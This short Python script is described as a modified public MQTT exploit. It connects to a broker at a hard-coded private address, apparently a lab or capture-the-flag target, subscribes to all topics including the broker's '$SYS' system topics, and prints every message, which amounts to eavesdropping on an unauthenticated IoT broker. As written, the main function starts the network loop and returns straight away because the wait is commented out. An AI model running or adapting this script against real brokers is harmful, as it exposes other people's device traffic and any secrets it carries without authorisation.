#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "10.10.78.75"
PORT = 1883

def on_connect(client, userdata, flags, rc):
	client.subscribe('#', qos=1)
	client.subscribe('$SYS/#')

def on_message(client, userdata, message):
	print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
	client = mqtt.Client()
	client.on_connect = on_connect
	client.on_message = on_message
	client.connect(HOST, PORT)
	client.loop_start()
	#time.sleep(10)
	#client.loop_stop()

if __name__ == "__main__":
	main()